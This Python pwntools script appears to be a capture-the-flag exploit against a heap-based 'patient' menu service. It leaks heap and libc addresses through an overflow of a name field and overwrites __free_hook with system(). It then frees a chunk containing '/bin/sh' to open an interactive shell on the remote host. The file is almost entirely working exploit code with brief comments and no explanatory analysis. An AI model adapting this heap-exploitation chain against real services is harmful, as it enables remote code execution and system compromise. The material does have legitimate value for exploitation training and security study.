#!/usr/bin/env python3

from pwn import *
import sys
import time
from binascii import hexlify

leak = ""
padding = 32
WORD = 'Bye'
MSG = b'>'
MSG_1 = b'name :'
MSG_3 = b'index :'
MSG_3_bis = MSG_1
host, PORT = '10.4.0.12', 31338 


def get_addr_from_leak(leak):
    addr = '0x0000'
    for i in range(1,len(leak)+1):
        addr += hex(ord(leak[-i]))[2:]
    addr = int(addr, 16)
    return addr
    
libc = ELF("pack/lib/x86_64-linux-gnu/libc-2.33.so")
malloc_diff = libc.symbols["__malloc_hook"]
free_diff = libc.symbols["__free_hook"]
system = libc.symbols["system"]

print("System addr : ")
print(hex(system))

print("Malloc_hook : ")
print(hex(malloc_diff))

diff_system_malloc = malloc_diff-system
diff_system_free = free_diff-system

print("Malloc - system : ")
print(hex(diff_system_malloc))

p = remote(host, PORT)
#p = process("./pack/challenge")

p.recvuntil(MSG)

# The number of bytes written (here 6) represents the number of bytes of the address that we're gonna leak
p.sendline(b'1')
p.recvuntil(MSG_1)
p.sendline(b'hugott')
p.recvuntil(MSG)

p.sendline(b'1')
p.recvuntil(MSG_1)
p.sendline(b'aAaaaa')
p.recvuntil(MSG)

# What we will free
p.sendline(b'1')
p.recvuntil(MSG_1)
p.sendline(b'/bin/sh\x00')
p.recvuntil(MSG)

p.sendline(b'3')
p.recvuntil(MSG_3)
p.sendline(b'0')
p.recvuntil(MSG_3_bis)
p.sendline(b'a' * padding + b'\x60')    
p.recvuntil(MSG)
p.sendline(b'5')
rep = p.recvuntil(MSG)

# get address
address = rep.split(b'0 : ')[1].split(b'\nPatient')[0]
L = [address[i:i+1] for i in range(len(address))]
addr = get_addr_from_leak(L)

heap_addr = addr - 11104
beginning_addr = addr - 0x20
stderr_address_loc = heap_addr + 0x308

# rewrite address
p.sendline(b'3')
p.recvuntil(MSG_3)
p.sendline(b'0')
p.recvuntil(MSG_3_bis)
p.sendline(p64(beginning_addr) + p64(0x6) + p64(0x4) + p64(stderr_address_loc))
p.recvuntil(MSG)
p.sendline(b'5')
rep = p.recvuntil(MSG)

#get stderr_address

address = rep.split(b'1 : ')[1].split(b'\nPatient')[0]
L = [address[i:i+1] for i in range(len(address))]
stderr_address = get_addr_from_leak(L)

#interestant functions
system_addr = stderr_address - 0x191b80
base_addr = system_addr - 0x04fa60

free_hook = system_addr + diff_system_free

# free_hook

# we make the first name pointing to free_hook
p.sendline(b'3')
p.recvuntil(MSG_3)
p.sendline(b'0')
p.recvuntil(MSG_3_bis)
p.sendline(b'a' * padding + p64(free_hook) + p64(0))



# we write system address in free_hook
p.recvuntil(MSG)
p.sendline(b'3')
p.recvuntil(MSG_3)
p.sendline(b'0')
p.recvuntil(MSG_3_bis)
p.sendline(p64(system_addr))

#Here, we free the second one where is written /bin/sh. If we just use 4 it works too but we still see the menu of the challenge.
p.sendline(b'4')
# 4 returns index : like 3 
p.recvuntil(MSG_3)
p.sendline(b'2')
p.interactive()
p.close()

